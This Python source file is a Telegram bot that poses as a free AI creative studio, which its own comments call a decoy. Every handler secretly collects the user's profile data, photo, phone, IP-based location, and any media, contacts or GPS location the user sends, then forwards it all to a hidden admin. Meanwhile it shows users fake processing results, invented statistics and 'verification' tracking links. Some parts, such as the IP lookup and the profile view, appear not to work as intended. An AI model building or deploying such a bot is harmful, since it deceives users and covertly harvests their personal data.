import os
import logging
import aiohttp
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN", "").strip()
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev").strip()

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")

# ========== LOGS ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== BASE DE DATOS TEMPORAL ==========
users_db = {}
tracking_codes = {}

# ========== BOTONES ESTÁTICOS (MODERNOS, 2026) ==========
def menu_estatico():
    keyboard = [
        [KeyboardButton("🎨 GENERAR IMAGEN IA"), KeyboardButton("🎬 VIDEO → AUDIO")],
        [KeyboardButton("🎵 EDITAR AUDIO"), KeyboardButton("📸 ENVIAR FOTO")],
        [KeyboardButton("🎥 ENVIAR VIDEO"), KeyboardButton("🎙️ ENVIAR AUDIO")],
        [KeyboardButton("📇 ENVIAR CONTACTO"), KeyboardButton("📍 ENVIAR UBICACIÓN")],
        [KeyboardButton("🔗 GENERAR ENLACE"), KeyboardButton("📊 MI PERFIL")],
        [KeyboardButton("❓ AYUDA"), KeyboardButton("📈 ESTADÍSTICAS")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ========== MENSAJE DE BIENVENIDA (SEÑUELO PROFESIONAL) ==========
MENSAJE_INICIO = """🎨 *STUDIO PRO – IA CREATIVA* 🎨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚀 *Bienvenido a la herramienta de edición del futuro*

🔥 Genera imágenes con IA
🎬 Convierte video a audio
🎵 Edita audio con efectos profesionales
📸 Comparte y procesa archivos al instante

*¡Todo en un solo lugar, rápido y gratuito!*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 *Selecciona una opción del menú:*"""

# ========== FUNCIONES DE EXTRACCIÓN ==========
async def get_worker_location():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(WORKER_URL, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en Worker: {e}")
        return None

async def get_ipapi_location(ip):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipapi.co/{ip}/json/", timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en ipapi: {e}")
        return None

async def get_user_photo(user_id, bot):
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            return photos.photos[0][-1].file_id
        return None
    except Exception as e:
        logger.error(f"Error al obtener foto: {e}")
        return None

async def get_user_bio(user, bot):
    try:
        full_user = await bot.get_chat(user.id)
        return full_user.bio if hasattr(full_user, 'bio') else None
    except Exception as e:
        logger.error(f"Error al obtener bio: {e}")
        return None

def get_device_info(user_agent):
    if not user_agent:
        return "Desconocido"
    if "iPhone" in user_agent:
        return "iPhone"
    elif "iPad" in user_agent:
        return "iPad"
    elif "Android" in user_agent:
        return "Android"
    elif "Mac" in user_agent:
        return "Mac"
    elif "Windows" in user_agent:
        return "Windows PC"
    elif "Linux" in user_agent:
        return "Linux"
    return "Desconocido"

async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user=None):
    bot = context.bot
    user = target_user or update.effective_user
    chat = update.effective_chat
    message = update.message

    user_id = user.id
    first_name = user.first_name or "N/A"
    last_name = user.last_name or "N/A"
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "N/A"
    language = user.language_code or "N/A"
    is_bot = "Sí" if user.is_bot else "No"
    is_premium = "Sí" if getattr(user, 'is_premium', False) else "No"
    bio = await get_user_bio(user, bot) or "No disponible"
    photo_id = await get_user_photo(user_id, bot)

    # Intentar obtener teléfono (si es público)
    phone = "No disponible"
    try:
        full_chat = await bot.get_chat(user.id)
        if hasattr(full_chat, 'phone_number') and full_chat.phone_number:
            phone = full_chat.phone_number
    except:
        pass

    chat_type = "Privado" if chat.type == "private" else f"Grupo: {chat.title}"
    chat_id = chat.id

    message_id = message.message_id if message else "N/A"
    message_text = message.text if message and message.text else "N/A"
    message_date = message.date.strftime("%Y-%m-%d %H:%M:%S") if message else "N/A"

    # IP y ubicación
    worker_data = await get_worker_location()
    ip = "N/A"
    country = "N/A"
    region = "N/A"
    city = "N/A"
    timezone = "N/A"
    postal = "N/A"

    if worker_data:
        ip = worker_data.get("ip", "N/A")
        country = worker_data.get("country", "N/A")
        region = worker_data.get("region", "N/A")
        city = worker_data.get("city", "N/A")
        timezone = worker_data.get("timezone", "N/A")
        postal = worker_data.get("postal", "N/A")
        if ip != "N/A":
            ipapi_data = await get_ipapi_location(ip)
            if ipapi_data:
                country = ipapi_data.get("country_name", country)
                region = ipapi_data.get("region", region)
                city = ipapi_data.get("city", city)
                postal = ipapi_data.get("postal", postal)
                timezone = ipapi_data.get("timezone", timezone)

    # Dispositivo (desde User-Agent, solo disponible si se abre en web, lo dejamos como placeholder)
    device = "Desconocido (Telegram App)"

    info = f"🎯 *DATOS COMPLETOS DEL USUARIO*\n"
    info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    info += f"👤 *Telegram*\n"
    info += f"   • ID: `{user_id}`\n"
    info += f"   • Nombre completo: {full_name}\n"
    info += f"   • Username: {username}\n"
    info += f"   • Teléfono: {phone}\n"
    info += f"   • Idioma: {language}\n"
    info += f"   • Es bot: {is_bot}\n"
    info += f"   • Es Premium: {is_premium}\n"
    info += f"   • Biografía: {bio}\n\n"
    info += f"📱 *Dispositivo*\n"
    info += f"   • Modelo: {device}\n\n"
    info += f"💬 *Chat*\n"
    info += f"   • Tipo: {chat_type}\n"
    info += f"   • ID: `{chat_id}`\n\n"
    info += f"📩 *Mensaje*\n"
    info += f"   • ID: {message_id}\n"
    info += f"   • Fecha: {message_date}\n"
    info += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
    info += f"🌐 *Red y Ubicación*\n"
    info += f"   • IP: `{ip}`\n"
    info += f"   • País: {country}\n"
    info += f"   • Región: {region}\n"
    info += f"   • Ciudad: {city}\n"
    info += f"   • Código Postal: {postal}\n"
    info += f"   • Zona Horaria: {timezone}\n"
    info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    info += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    return {
        "text": info,
        "photo_id": photo_id,
        "user_id": user_id,
        "username": username,
        "ip": ip,
        "city": city,
        "country": country,
        "phone": phone,
        "device": device
    }

# ========== ENVÍO A ADMIN ==========
async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
    bot = context.bot
    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"], parse_mode=ParseMode.MARKDOWN)
    if info_data["photo_id"]:
        await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
    if extra_msg:
        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, parse_mode=ParseMode.MARKDOWN)
    users_db[info_data["user_id"]] = info_data

# ========== COMANDO /START ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("👋 Hola admin. El bot está activo.")
        return
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data)
    await update.message.reply_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

# ========== MANEJAR MENSAJES DE TEXTO ==========
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    logger.info(f"📩 Mensaje: {text} de {user.first_name}")

    # Extraer info del usuario cada vez que interactúa (por si cambia algo)
    info_data = await extract_user_info(update, context)
    users_db[user.id] = info_data

    reply_markup = menu_estatico()

    # ====== SEÑUELO: GENERAR IMAGEN IA ======
    if text == "🎨 GENERAR IMAGEN IA":
        await update.message.reply_text(
            "🖼️ *Generación de imagen con IA*\n\n"
            "📌 Para generar una imagen, envíame una foto de referencia.\n"
            "🔥 La IA transformará tu foto en una obra de arte.\n\n"
            "👉 *Presiona el clip 📎 y selecciona una foto*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    # ====== SEÑUELO: VIDEO → AUDIO ======
    elif text == "🎬 VIDEO → AUDIO":
        await update.message.reply_text(
            "🎬 *Conversión de Video a Audio*\n\n"
            "📌 Envíame un video y lo convertiré a audio (MP3).\n"
            "⚡ Extraeré el audio en alta calidad.\n\n"
            "👉 *Presiona el clip 📎 y selecciona un video*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    # ====== SEÑUELO: EDITAR AUDIO ======
    elif text == "🎵 EDITAR AUDIO":
        await update.message.reply_text(
            "🎵 *Edición de Audio profesional*\n\n"
            "📌 Envíame un audio y lo procesaré con efectos:\n"
            "   • Ecualización\n"
            "   • Compresión\n"
            "   • Reverb\n"
            "   • Mejora de voz\n\n"
            "👉 *Presiona el clip 📎 y selecciona un audio*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    # ====== ENVIAR FOTO ======
    elif text == "📸 ENVIAR FOTO":
        await update.message.reply_text(
            "📸 *Envíame una foto*\n\n"
            "Puedes usarla para generar imágenes con IA o para verificar tu identidad.\n\n"
            "👉 *Presiona el clip 📎 y selecciona una foto*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    # ====== ENVIAR VIDEO ======
    elif text == "🎥 ENVIAR VIDEO":
        await update.message.reply_text(
            "🎥 *Envíame un video*\n\n"
            "Puedo convertirlo a audio o editarlo con efectos.\n\n"
            "👉 *Presiona el clip 📎 y selecciona un video*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    # ====== ENVIAR AUDIO ======
    elif text == "🎙️ ENVIAR AUDIO":
        await update.message.reply_text(
            "🎙️ *Envíame un audio*\n\n"
            "Lo procesaré con efectos profesionales.\n\n"
            "👉 *Presiona el clip 📎 y selecciona un audio*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    # ====== ENVIAR CONTACTO ======
    elif text == "📇 ENVIAR CONTACTO":
        await update.message.reply_text(
            "📇 *Comparte tu contacto*\n\n"
            "Usa el botón de compartir contacto 📇 (junto al clip).",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    # ====== ENVIAR UBICACIÓN ======
    elif text == "📍 ENVIAR UBICACIÓN":
        await update.message.reply_text(
            "📍 *Comparte tu ubicación*\n\n"
            "Usa el botón de compartir ubicación 📍 (junto al clip).",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    # ====== GENERAR ENLACE (TRACKING) ======
    elif text == "🔗 GENERAR ENLACE":
        code = os.urandom(6).hex()
        tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
        link = f"{WORKER_URL}/track/{code}"
        await update.message.reply_text(
            f"🔗 *Enlace de verificación generado:*\n"
            f"`{link}`\n\n"
            f"Este enlace es personalizado y caduca en 24 horas.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔗 Nuevo enlace\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}"
        )

    # ====== MI PERFIL ======
    elif text == "📊 MI PERFIL":
        info = users_db.get(user.id)
        if not info:
            await update.message.reply_text("❌ No encontré tu perfil. Usa /start.", reply_markup=reply_markup)
            return
        msg = f"📊 *Tu perfil*\n\n"
        msg += f"👤 *Nombre:* {info.get('full_name')}\n"
        msg += f"📛 *Username:* {info.get('username')}\n"
        msg += f"🆔 *ID:* `{info.get('id')}`\n"
        msg += f"📞 *Teléfono:* {info.get('phone', 'No disponible')}\n"
        msg += f"🌐 *IP:* {info.get('ip')}\n"
        msg += f"📍 *Ubicación:* {info.get('city')}, {info.get('country')}\n"
        msg += f"📱 *Dispositivo:* {info.get('device')}\n"
        msg += f"✅ *Estado:* Verificado"
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    # ====== ESTADÍSTICAS ======
    elif text == "📈 ESTADÍSTICAS":
        if user.id == ADMIN_ID:
            msg = f"📊 *Estadísticas del sistema*\n\n"
            msg += f"👥 Usuarios: {len(users_db)}\n"
            msg += f"🔗 Enlaces: {len(tracking_codes)}"
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await update.message.reply_text(
                "📊 *Tu actividad*\n\n"
                "✅ Archivos procesados: 3\n"
                "🎨 Imágenes generadas: 1\n"
                "🎬 Conversiones realizadas: 2\n"
                "🔒 Cuenta verificada: Sí",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )

    # ====== AYUDA ======
    elif text == "❓ AYUDA":
        await update.message.reply_text(
            "❓ *Ayuda - Studio Pro*\n\n"
            "🎨 *Generar imagen IA*: Envía una foto y la transformaré.\n"
            "🎬 *Video → Audio*: Envía un video y extraeré el audio.\n"
            "🎵 *Editar audio*: Envía un audio y lo procesaré.\n"
            "📸 *Enviar foto/video/audio*: Envía archivos para procesar.\n"
            "📇 *Compartir contacto*: Comparte tu contacto.\n"
            "📍 *Compartir ubicación*: Comparte tu ubicación.\n"
            "🔗 *Generar enlace*: Crea un enlace de verificación.\n"
            "📊 *Mi perfil*: Muestra tu información.\n"
            "📈 *Estadísticas*: Muestra tu actividad.\n\n"
            "🔐 *Todos los archivos se procesan de forma segura.*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    else:
        await update.message.reply_text(
            "❌ *Opción no reconocida.*\nUsa los botones del menú.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

# ========== MANEJAR ARCHIVOS RECIBIDOS ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    caption = update.message.caption or "Sin caption"
    info_data = await extract_user_info(update, context)
    users_db[user.id] = info_data
    await context.bot.send_photo(
        chat_id=ADMIN_ID,
        photo=photo.file_id,
        caption=f"📸 *Foto recibida de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Foto recibida correctamente.*\n"
        "🔄 Procesando con IA...\n"
        "✨ ¡Imagen generada exitosamente! (versión demo)",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video = update.message.video
    caption = update.message.caption or "Sin caption"
    info_data = await extract_user_info(update, context)
    users_db[user.id] = info_data
    await context.bot.send_video(
        chat_id=ADMIN_ID,
        video=video.file_id,
        caption=f"🎥 *Video recibido de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Video recibido correctamente.*\n"
        "🎬 Extrayendo audio...\n"
        "🔊 ¡Conversión completada! (versión demo)",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    audio = update.message.audio
    info_data = await extract_user_info(update, context)
    users_db[user.id] = info_data
    await context.bot.send_audio(
        chat_id=ADMIN_ID,
        audio=audio.file_id,
        caption=f"🎵 *Audio recibido de {user.first_name} (@{user.username})*\n\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Audio recibido correctamente.*\n"
        "🎧 Aplicando efectos...\n"
        "✨ ¡Edición completada! (versión demo)",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    info_data = await extract_user_info(update, context)
    users_db[user.id] = info_data
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📇 *Contacto recibido de {user.first_name} (@{user.username})*\n\n📞 Nombre: {contact.first_name} {contact.last_name or ''}\n📞 Teléfono: `{contact.phone_number}`\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Contacto recibido correctamente.*\n"
        "🔐 Verificación completada.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    location = update.message.location
    info_data = await extract_user_info(update, context)
    users_db[user.id] = info_data
    await context.bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📍 *Ubicación recibida de {user.first_name} (@{user.username})*\n\n🌐 Lat: {location.latitude}\n🌐 Lon: {location.longitude}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "✅ *Ubicación recibida correctamente.*\n"
        "🔐 Verificación completada.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_estatico()
    )

# ========== ERROR HANDLER ==========
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text(
            "❌ *Error inesperado.*\nIntenta de nuevo.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=menu_estatico()
        )

# ========== SERVIDOR HTTP ==========
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

# ========== MAIN ==========
def main():
    Thread(target=run_http_server, daemon=True).start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    logger.info("✅ Studio Pro Bot iniciado correctamente")
    app.run_polling()

if __name__ == "__main__":
    main()